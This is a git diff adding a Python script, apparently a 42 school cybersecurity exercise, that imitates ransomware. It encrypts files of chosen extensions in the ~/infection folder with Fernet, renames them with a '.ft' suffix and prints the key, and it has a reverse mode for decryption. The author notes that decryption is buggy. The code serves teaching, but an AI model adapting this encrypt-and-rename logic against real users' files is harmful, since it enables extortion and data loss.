@@ -1,6 +1,65 @@
 #!/usr/bin/env python3
 
+
+#############
+# Bug : it not decrypt ....
+#############
 import argparse
+import sys
+from cryptography.fernet import Fernet
+import os
+import glob
+
+# generate key
+def generate_key():
+    return Fernet.generate_key()
+
+##################  Encrypt and Decrypt file  ########################
+def encrypt_file(key, file_path, silent):
+    with open(file_path, 'rb') as file: # 'rb' read binary
+        data = file.read()
+
+    # print(f"la data -->{data}")
+
+    fernet = Fernet(key)
+    encryption_data = fernet.encrypt(data)
+
+    with open(file_path, 'wb') as file:
+        file.write(encryption_data)
+
+    if not silent:
+        print(f"Encrypted: {file_path}")
+
+def decrypt_file(file_path, key, silent):
+    with open(file_path, 'rb') as file:
+        data = file.read()
+    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
+    fernet = Fernet(key)
+    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
+    decrypted_data = fernet.decrypt(data)
+    with open(file_path, 'wb') as file:
+        file.write(decrypted_data)
+    if not silent:
+        print(f"Decrypted: {file_path}")
+#########################################################################
+
+###############################  Name file  #############################
+def rename_file(file_path, silent):
+    new_file_path = file_path + ".ft"
+    if not file_path.endswith('.ft'):
+        os.rename(file_path, new_file_path)
+        if not silent:
+            print(f"Renamed: {file_path} to {new_file_path}")
+
+def reverse_rename_file(file_path, silent):
+    if file_path.endswith('.ft'):
+        original_file_path = file_path[:-3]
+        os.rename(file_path, original_file_path)
+        if not silent:
+            print(f"Renamed: {file_path} to {original_file_path}")
+
+#########################################################################
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
@@ -8,11 +67,58 @@ if __name__ == '__main__':
                     description='A specific feature of this type of program is its ability to spread through networks of hundreds of computers. In our case, your program will only affect a small portion of your local files',
                     epilog='42 Cybersecurity')
 
-    parser.add_argument('-v', '-version', action='store_true', help='how the version of the program')
-    parser.add_argument('-r', '-reverse', action='store_true', help='the key entered as an argument to reverse the infection')
-    parser.add_argument('-s', '--silent', action='store_true', help='the key entered as an argument to reverse the infection')
+    parser.add_argument('-v', '--version', action='store_true', help='Show the version of the program')
+    parser.add_argument('-r', '--reverse', type=str, help='Reverse the infection using the provided key')
+    parser.add_argument('-s', '--silent', action='store_true', help='Suppress output during the process')
 
     args = parser.parse_args()
+    # print(args)
+    # print(args.reverse)
 
-    if args.v:
-        print("Version 1.0.0")
+    try:
+        if args.version:
+            print("Version 1.0.0")
+            sys.exit(1)
+
+        home_dir = os.path.expanduser("~")
+        verif_infection_dir = os.path.join(home_dir, "infection")
+        if not os.path.exists(verif_infection_dir):
+            print(f"The directory {verif_infection_dir} does not exist.")
+            sys.exit(1)
+
+        # print(home_dir)
+        # test = generate_key()
+        # print("\n")
+        # print(test)
+        # print("\n")
+
+        extensions = ['.txt', '.io', 'pouet', 'bla']
+        files_to_process = [
+            file  # Include each file found in the final list
+            for ext in extensions  # Iterate over each extension in the wannacry_extensions list
+            for file in glob.glob(os.path.join(verif_infection_dir, f'*{ext}'))  # For each extension, find all matching files in the infection_dir
+        ]
+
+        if args.reverse:
+            # key = load_key(args.reverse)
+            key = args.reverse
+            ft_files_to_process = [
+                file for file in glob.glob(os.path.join(verif_infection_dir, '*.ft'))
+            ]
+            for file_path in ft_files_to_process:
+                print("dwwwwwwwwwwwwwwwww")
+                decrypt_file(file_path, key, args.silent)
+                reverse_rename_file(file_path, args.silent)
+
+        else:
+            key = generate_key()
+            # print(f"key: {key}")
+            print(f"Encryption key: {key.decode()}")
+            for file_path in files_to_process:
+                print("aaaaaaaaaaaaaaaaaaa")
+                encrypt_file(key, file_path, args.silent)
+                rename_file(file_path, args.silent)
+
+    except Exception as e:
+        print(f"An error occurred: {e}", file=sys.stderr)
+        sys.exit(1)
